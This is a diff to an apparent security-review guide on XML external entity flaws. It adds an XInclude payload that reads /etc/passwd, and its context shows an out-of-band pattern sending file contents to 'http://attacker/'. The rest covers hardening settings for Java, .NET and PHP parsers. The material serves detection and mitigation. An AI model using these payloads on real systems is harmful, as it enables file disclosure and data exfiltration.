@@ -34,11 +34,23 @@ responses, RSS/Atom import, XML config upload, `Content-Type: application/xml` o
   to `http://attacker/?%file;`.
 - Billion laughs DoS: nested entity expansion.
 - SVG/Office upload: embed the DOCTYPE inside the XML part of an uploaded SVG/DOCX.
+- **XInclude (no DOCTYPE needed)**: when the app rejects/strips a `DOCTYPE` but drops attacker XML into an
+  existing document's body (not the whole document), a `DOCTYPE` declaration isn't possible — instead use
+  `xi:include` if the parser has XInclude enabled: `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`.
+  This bypasses DOCTYPE-based filters entirely, so "no `<!DOCTYPE`" is not itself a false-positive signal —
+  check whether XInclude is also disabled (`setXIncludeAware(false)` in Java, or equivalent).
 
 ## False-positive filters
 - Parser hardened: `disallow-doctype-decl` true, `external-general-entities`/`external-parameter-entities`
   false, `XMLResolver=null`, `resolve_entities=False`, using `defusedxml`, `LIBXML_NONET` and DTD loading off,
   .NET `DtdProcessing.Prohibit`.
+- Java specifically: hardening must **also** set `setXIncludeAware(false)` and `ACCESS_EXTERNAL_DTD`/
+  `ACCESS_EXTERNAL_SCHEMA` to `""` (JAXP 1.5+) — `disallow-doctype-decl` alone still leaves XInclude and
+  external-schema resolution reachable. For SAX/StAX, confirm the hardened factory/property is applied to
+  every reader instance the factory creates, not just the factory object itself.
+- .NET 4.5.2+ defaults (`XmlReader`, `XDocument`) are safe out of the box; only flag older TFMs or explicit
+  `XmlTextReader`/`XmlDocument` use without the settings above. PHP 8.0+ disables external entities by
+  default; only flag PHP <8.0 without `libxml_set_external_entity_loader(null)`/`LIBXML_NOENT` off.
 - Input is JSON, not XML; or XML comes only from a trusted internal source.
 
 ## CWE / OWASP / severity
@@ -51,5 +63,7 @@ present in SAML flows -> `auth` bypass.
 
 ## Mitigation
 Disable DTDs and external entity resolution on every XML parser handling untrusted input (use the
-hardened factory settings above or a safe library like `defusedxml`); prefer JSON where possible; validate
-uploads that are XML-backed (SVG/Office) with the same hardening.
+hardened factory settings above or a safe library like `defusedxml`); also disable XInclude
+(`setXIncludeAware(false)`) since it is a separate feature from DTD/entity processing and is not covered by
+`disallow-doctype-decl`; prefer JSON where possible; validate uploads that are XML-backed (SVG/Office) with
+the same hardening.
